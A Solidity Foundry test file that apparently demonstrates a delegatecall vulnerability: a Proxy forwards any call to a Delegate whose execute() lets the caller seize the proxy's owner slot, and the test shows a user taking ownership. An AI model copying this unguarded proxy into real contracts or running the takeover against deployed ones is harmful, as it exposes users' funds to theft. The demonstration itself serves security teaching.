pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract Proxy {
    address public owner = address(0xdeadbeef);
    Delegate delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
    }

    fallback() external {
        (bool suc, ) = address(delegate).delegatecall(msg.data);
        require(suc, "Delegatecall failed");
    }
}

contract ContractTest is Test {
    Proxy proxy;
    Delegate DelegateContract;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
    }

    function testDelegatecall() public {
        DelegateContract = new Delegate();
        proxy = new Proxy(address(DelegateContract));

        console.log("Alice address", alice);
        console.log("DelegationContract owner", proxy.owner());

        console.log("Change DelegationContract owner to Alice...");
        vm.prank(alice);
        address(proxy).call(abi.encodeWithSignature("execute()"));

        console.log("DelegationContract owner", proxy.owner());
        console.log(
        "operate completed, proxy contract storage has been manipulated"
    );
}
}

contract Delegate {
    address public owner;

    function execute() public {
        owner = msg.sender;
    }
}